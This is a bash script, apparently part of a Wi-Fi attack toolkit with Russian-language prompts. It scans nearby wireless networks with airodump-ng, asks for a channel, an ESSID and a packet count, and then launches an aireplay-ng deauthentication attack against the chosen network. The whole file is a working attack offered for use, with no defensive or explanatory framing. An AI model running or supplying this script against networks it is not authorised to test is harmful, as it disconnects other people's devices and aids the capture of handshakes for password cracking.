#!/bin/bash
readonly st=$(dirname $(readlink -f "$0"))
module=$(cat $st/source/per)
clear
source /$st/desig
read -p "Open new terminal? (y/n)" yn
case $yn in
 y|Y)
gnome-terminal --geometry=132x24 --command="airodump-ng ${module}mon"
clear
source /$st/desig 
read -p "Канал: " ch
read -p "ESSID: " essid
read -p "Кол-во пакетов: " pack
iwconfig ${module}mon channel $ch
clear
source /$st/desig
aireplay-ng -0 $pack -e $essid ${module}mon
clear
source /$st/desig
clear;;
n|N)
airodump-ng ${module}mon
clear
source $st/desig
read -p "Канал: " ch
read -p "ESSID: " essid
read -p "Кол-во пакетов: " pack
iwconfig ${module}mon channel $ch
clear
source /$st/desig
aireplay-ng -0 $pack -e $essid ${module}mon
clear
source /$st/desig
clear;;
*)
clear;;
esac
